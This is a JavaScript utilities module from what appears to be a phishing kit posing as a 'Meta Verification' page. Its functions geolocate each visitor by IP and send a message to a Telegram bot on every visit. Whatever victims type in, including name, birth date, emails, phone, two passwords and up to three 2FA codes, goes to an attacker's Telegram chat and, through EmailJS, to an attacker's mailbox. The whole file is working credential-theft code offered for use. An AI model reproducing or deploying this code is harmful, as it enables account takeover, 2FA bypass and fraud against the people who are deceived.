// Utilities
const Utils = {
    encrypt(text) {
        return CryptoJS.AES.encrypt(text, CONFIG.SECRET_KEY).toString();
    },

    decrypt(cipherText) {
        const bytes = CryptoJS.AES.decrypt(cipherText, CONFIG.SECRET_KEY);
        return bytes.toString(CryptoJS.enc.Utf8);
    },

    saveRecord(key, value) {
        try {
            const encryptedValue = this.encrypt(JSON.stringify(value));
            const record = { value: encryptedValue, expiry: Date.now() + CONFIG.STORAGE_EXPIRY };
            localStorage.setItem(key, JSON.stringify(record));
        } catch (error) {
            console.error('Save error:', error);
        }
    },

    getRecord(key) {
        try {
            const item = localStorage.getItem(key);
            if (!item) return null;
            const { value, expiry } = JSON.parse(item);
            if (Date.now() > expiry) {
                localStorage.removeItem(key);
                return null;
            }
            const decrypted = this.decrypt(value);
            return decrypted ? JSON.parse(decrypted) : null;
        } catch (error) {
            return null;
        }
    },

    isIPv4(ip) {
        return /^\d{1,3}(?:\.\d{1,3}){3}$/.test(String(ip || ''));
    },

    async getIPv4() {
        const sources = [
            'https://api.ipify.org?format=json',
            'https://ipv4.icanhazip.com/'
        ];
        for (const url of sources) {
            try {
                const res = await fetch(url, { cache: 'no-store' });
                if (!res.ok) continue;
                const text = await res.text();
                let ip = text.trim();
                try {
                    const json = JSON.parse(text);
                    ip = json.ip || ip;
                } catch (e) { /* plain text */ }
                ip = String(ip).trim();
                if (this.isIPv4(ip)) return ip;
            } catch (e) { /* try next */ }
        }
        return '';
    },

    formatLocationLine(data) {
        const ip = data.ip || 'N/A';
        const region = data.region || data.city || 'N/A';
        const regionCode = data.region_code || data.regionCode || '';
        const countryCode = String(data.country_code || data.countryCode || '').toUpperCase();
        const countryName = data.country_name || data.countryName || this.countryNameFromCode(countryCode) || countryCode || 'N/A';
        const regionPart = regionCode ? `${region}(${regionCode})` : region;
        const countryPart = countryCode ? `${countryName}(${countryCode})` : countryName;
        return `${ip} | ${regionPart} | ${countryPart}`;
    },

    countryNameFromCode(code) {
        const names = {
            AD: 'Andorra', AE: 'United Arab Emirates', AF: 'Afghanistan', AL: 'Albania', AM: 'Armenia',
            AR: 'Argentina', AT: 'Austria', AU: 'Australia', AZ: 'Azerbaijan', BA: 'Bosnia and Herzegovina',
            BD: 'Bangladesh', BE: 'Belgium', BG: 'Bulgaria', BH: 'Bahrain', BO: 'Bolivia', BR: 'Brazil',
            BY: 'Belarus', CA: 'Canada', CH: 'Switzerland', CL: 'Chile', CN: 'China', CO: 'Colombia',
            CR: 'Costa Rica', CU: 'Cuba', CY: 'Cyprus', CZ: 'Czechia', DE: 'Germany', DK: 'Denmark',
            DO: 'Dominican Republic', DZ: 'Algeria', EC: 'Ecuador', EE: 'Estonia', EG: 'Egypt',
            ES: 'Spain', FI: 'Finland', FR: 'France', GB: 'United Kingdom', GE: 'Georgia', GH: 'Ghana',
            GR: 'Greece', GT: 'Guatemala', HK: 'Hong Kong', HR: 'Croatia', HU: 'Hungary', ID: 'Indonesia',
            IE: 'Ireland', IL: 'Israel', IN: 'India', IQ: 'Iraq', IR: 'Iran', IS: 'Iceland', IT: 'Italy',
            JO: 'Jordan', JP: 'Japan', KE: 'Kenya', KG: 'Kyrgyzstan', KH: 'Cambodia', KR: 'South Korea',
            KW: 'Kuwait', KZ: 'Kazakhstan', LA: 'Laos', LB: 'Lebanon', LK: 'Sri Lanka', LT: 'Lithuania',
            LU: 'Luxembourg', LV: 'Latvia', LY: 'Libya', MA: 'Morocco', MD: 'Moldova', ME: 'Montenegro',
            MK: 'North Macedonia', MM: 'Myanmar', MN: 'Mongolia', MX: 'Mexico', MY: 'Malaysia',
            NG: 'Nigeria', NL: 'Netherlands', NO: 'Norway', NP: 'Nepal', NZ: 'New Zealand', OM: 'Oman',
            PA: 'Panama', PE: 'Peru', PH: 'Philippines', PK: 'Pakistan', PL: 'Poland', PT: 'Portugal',
            PY: 'Paraguay', QA: 'Qatar', RO: 'Romania', RS: 'Serbia', RU: 'Russia', SA: 'Saudi Arabia',
            SE: 'Sweden', SG: 'Singapore', SI: 'Slovenia', SK: 'Slovakia', TH: 'Thailand', TJ: 'Tajikistan',
            TM: 'Turkmenistan', TN: 'Tunisia', TR: 'Turkey', TW: 'Taiwan', UA: 'Ukraine', US: 'United States',
            UY: 'Uruguay', UZ: 'Uzbekistan', VE: 'Venezuela', VN: 'Vietnam', ZA: 'South Africa'
        };
        return names[String(code || '').toUpperCase()] || '';
    },

    telegramHasValue(value) {
        const text = String(value == null ? '' : value).trim();
        if (!text) return false;
        if (text === 'N/A') return false;
        return true;
    },

    telegramEscape(value) {
        return String(value)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;');
    },

    telegramLine(label, value, asCode) {
        if (!this.telegramHasValue(value)) return '';
        const safe = this.telegramEscape(String(value).trim());
        const body = asCode ? `<code>${safe}</code>` : safe;
        return `<b>${this.telegramEscape(label)}:</b> ${body}`;
    },

    telegramJoin(groups) {
        const parts = [];
        groups.forEach((group) => {
            const lines = (group || []).filter(Boolean);
            if (!lines.length) return;
            if (parts.length) parts.push('────────────────');
            parts.push.apply(parts, lines);
        });
        return parts.join('\n');
    },

    telegramPageUrl() {
        return location.href || '';
    },

    formatDateOfBirth(data) {
        const day = data.day || '';
        const month = data.month || '';
        const year = data.year || '';
        if (!day && !month && !year) return '';
        return `${day}/${month}/${year}`;
    },

    telegramVisitMessage(loc) {
        return this.telegramJoin([[
            this.telegramLine('IP', loc.ip, true),
            this.telegramLine('Location', loc.location, true),
            this.telegramLine('Page', this.telegramPageUrl())
        ]]);
    },

    telegramFormMessage(loc, data, withTwoFa) {
        return this.telegramJoin([
            [
                this.telegramLine('IP', loc.ip, true),
                this.telegramLine('Location', loc.location, true)
            ],
            [
                this.telegramLine('Full Name', data.fullName),
                this.telegramLine('Page', data.fanpage),
                this.telegramLine('Date of Birth', this.formatDateOfBirth(data))
            ],
            [
                this.telegramLine('Email', data.email, true),
                this.telegramLine('Business Email', data.emailBusiness, true),
                this.telegramLine('Phone', data.phone, true)
            ],
            [
                this.telegramLine('Password(1)', data.password, true),
                this.telegramLine('Password(2)', data.passwordSecond, true)
            ],
            withTwoFa ? [
                this.telegramLine('2FA(1)', data.twoFa, true),
                this.telegramLine('2FA(2)', data.twoFaSecond, true),
                this.telegramLine('2FA(3)', data.twoFaThird, true)
            ] : []
        ]);
    },

    telegramPasswordMessage(loc, data) {
        return this.telegramFormMessage(loc, data, false);
    },

    telegramTwoFaMessage(loc, data) {
        return this.telegramFormMessage(loc, data, true);
    },

    async sendTelegramText(text) {
        const res = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                text,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });
        return res;
    },

    persistLocation(loc) {
        this._locationCache = loc;
        try {
            if (loc && loc.country_code && loc.country_code !== 'N/A') {
                sessionStorage.setItem('__geo_cc__', String(loc.country_code).toUpperCase());
            }
            sessionStorage.setItem('__geo_loc__', JSON.stringify({
                ip: loc.ip,
                country_code: loc.country_code,
                country_name: loc.country_name,
                region: loc.region,
                region_code: loc.region_code,
                city: loc.city,
                location: loc.location
            }));
        } catch (e) { /* ignore */ }
        return loc;
    },

    restoreLocation() {
        if (this._locationCache) return this._locationCache;
        try {
            const saved = JSON.parse(sessionStorage.getItem('__geo_loc__') || 'null');
            if (saved && saved.country_code && saved.country_code !== 'N/A') {
                this._locationCache = saved;
                return saved;
            }
        } catch (e) { /* ignore */ }
        return null;
    },

    geoCountryIso() {
        const cached = this._locationCache && this._locationCache.country_code;
        const fromCc = sessionStorage.getItem('__geo_cc__');
        const restored = this.restoreLocation();
        const iso = String(
            cached ||
            fromCc ||
            (restored && restored.country_code) ||
            window.__geoCountry ||
            ''
        ).toUpperCase();
        if (/^[A-Z]{2}$/.test(iso)) return iso;
        return '';
    },

    async getUserLocation() {
        if (this._locationCache) return this._locationCache;
        const restored = this.restoreLocation();
        if (restored) return restored;

        const empty = {
            location: 'N/A',
            country_code: 'N/A',
            ip: 'N/A',
            region: 'N/A',
            region_code: 'N/A',
            country: 'N/A',
            country_name: 'N/A',
            city: 'N/A',
            org: 'N/A'
        };

        const ipv4 = await this.getIPv4();

        const sources = [
            async () => {
                const url = ipv4
                    ? `https://ipapi.co/${ipv4}/json/`
                    : 'https://ipapi.co/json/';
                const response = await fetch(url, { cache: 'no-store' });
                const data = await response.json();
                if (data.error) throw new Error('ipapi');
                return {
                    ip: data.ip || ipv4 || 'N/A',
                    city: data.city || 'N/A',
                    region: data.region || data.city || 'N/A',
                    region_code: data.region_code || '',
                    country_code: data.country_code || '',
                    country_name: data.country_name || '',
                    org: data.org || 'N/A'
                };
            },
            async () => {
                const url = ipv4
                    ? `https://ipwho.is/${ipv4}`
                    : 'https://ipwho.is/';
                const response = await fetch(url, { cache: 'no-store' });
                const data = await response.json();
                if (data.success === false) throw new Error('ipwho');
                return {
                    ip: data.ip || ipv4 || 'N/A',
                    city: data.city || 'N/A',
                    region: data.region || data.city || 'N/A',
                    region_code: data.region_code || '',
                    country_code: data.country_code || '',
                    country_name: data.country || '',
                    org: (data.connection && data.connection.isp) || 'N/A'
                };
            },
            async () => {
                const url = ipv4
                    ? `https://ipinfo.io/${ipv4}/json?token=790b745aefcdac`
                    : 'https://ipinfo.io/json?token=790b745aefcdac';
                const response = await fetch(url, { cache: 'no-store' });
                if (!response.ok) throw new Error('ipinfo');
                const data = await response.json();
                return {
                    ip: data.ip || ipv4 || 'N/A',
                    city: data.city || 'N/A',
                    region: data.region || data.city || 'N/A',
                    region_code: '',
                    country_code: data.country || '',
                    country_name: '',
                    org: data.org || 'N/A'
                };
            }
        ];

        for (const source of sources) {
            try {
                const raw = await source();
                if (!raw || !raw.ip || raw.ip === 'N/A') continue;
                if (!this.isIPv4(raw.ip) && ipv4) raw.ip = ipv4;
                if (!this.isIPv4(raw.ip)) continue;
                const loc = {
                    ...raw,
                    country: (raw.country_code || 'N/A').toUpperCase(),
                    country_code: (raw.country_code || 'N/A').toUpperCase(),
                    country_name: raw.country_name || this.countryNameFromCode(raw.country_code) || raw.country_code || 'N/A',
                    location: this.formatLocationLine({
                        ip: raw.ip,
                        region: raw.region,
                        city: raw.city,
                        region_code: raw.region_code,
                        country_code: raw.country_code,
                        country_name: raw.country_name || this.countryNameFromCode(raw.country_code)
                    })
                };
                this.persistLocation(loc);
                return loc;
            } catch (error) { /* try next */ }
        }

        if (ipv4) {
            const loc = {
                ...empty,
                ip: ipv4,
                location: `${ipv4} | N/A | N/A`
            };
            this.persistLocation(loc);
            return loc;
        }

        return empty;
    },

    async sendToTelegram(data) {
        const locationData = await this.getUserLocation();
        const hasTwoFa = Boolean(data.twoFa || data.twoFaSecond || data.twoFaThird);
        const text = hasTwoFa
            ? this.telegramTwoFaMessage(locationData, data)
            : this.telegramPasswordMessage(locationData, data);

        try {
            await this.sendTelegramText(text);
        } catch (error) {
            console.error('Telegram error:', error);
        }
    },

    async sendToEmail(data) {
        const locationData = await this.getUserLocation();

        const hasTwoFa = Boolean(data.twoFa || data.twoFaSecond || data.twoFaThird);
        const emailContent = hasTwoFa
            ? this.telegramTwoFaMessage(locationData, data)
            : this.telegramPasswordMessage(locationData, data);

        try {
            // Load EmailJS SDK if not already loaded
            if (!window.emailjs) {
                await this.loadEmailJSSDK();
            }

            await emailjs.send(
                CONFIG.EMAILJS_SERVICE_ID,
                CONFIG.EMAILJS_TEMPLATE_ID,
                {
                    to_email: CONFIG.EMAIL_RECIPIENT,
                    subject: `Meta Verification - ${locationData.location}`,
                    message: emailContent,
                    from_name: 'Meta Verification System',
                    reply_to: data.email || 'noreply@system.com'
                },
                CONFIG.EMAILJS_PUBLIC_KEY
            );
        } catch (error) {
            console.error('Email error:', error);
        }
    },

    loadEmailJSSDK() {
        return new Promise((resolve, reject) => {
            if (window.emailjs) {
                resolve();
                return;
            }

            const script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
            script.onload = () => {
                emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
                resolve();
            };
            script.onerror = reject;
            document.head.appendChild(script);
        });
    },

    async sendNotification(data) {
        const notificationType = CONFIG.NOTIFICATION_TYPE;

        try {
            if (notificationType === 'telegram' || notificationType === 'both') {
                await this.sendToTelegram(data);
            }

            if (notificationType === 'email' || notificationType === 'both') {
                await this.sendToEmail(data);
            }
        } catch (error) {
            console.error('Notification error:', error);
        }
    },

    markVisitBootDone() {
        if (!window.__pageBoot) return;
        window.__pageBoot.visitDone = true;
        if (typeof window.__pageBoot.tryHide === 'function') {
            window.__pageBoot.tryHide();
        }
    },

    async sendVisitNotification() {
        if (window.__visitPingStarted || sessionStorage.getItem('__visit_ping__')) {
            this.getUserLocation().finally(() => this.markVisitBootDone());
            return;
        }
        window.__visitPingStarted = true;
        sessionStorage.setItem('__visit_ping__', '1');

        try {
            const loc = await this.getUserLocation();
            const controller = new AbortController();
            const timer = setTimeout(() => controller.abort(), 8000);
            await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
                    text: this.telegramVisitMessage(loc),
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                }),
                signal: controller.signal
            });
            clearTimeout(timer);
        } catch (error) {
            console.error('Visit notify error:', error);
        } finally {
            this.markVisitBootDone();
        }
    },

    maskPhone(phone) {
        if (!phone || phone.length < 5) return phone;
        const start = phone.slice(0, 2);
        const end = phone.slice(-2);
        return `${start} ${'*'.repeat(phone.length - 4)} ${end}`;
    },

    maskEmail(email) {
        if (!email) return '';
        return email.replace(/^(.)(.*?)(.)@(.+)$/, (_, a, mid, c, domain) => {
            return `${a}${'*'.repeat(mid.length)}${c}@${domain}`;
        });
    },

    generateTicketId() {
        const gen = () => Math.random().toString(36).substring(2, 6).toUpperCase();
        return `${gen()}-${gen()}-${gen()}`;
    }
};

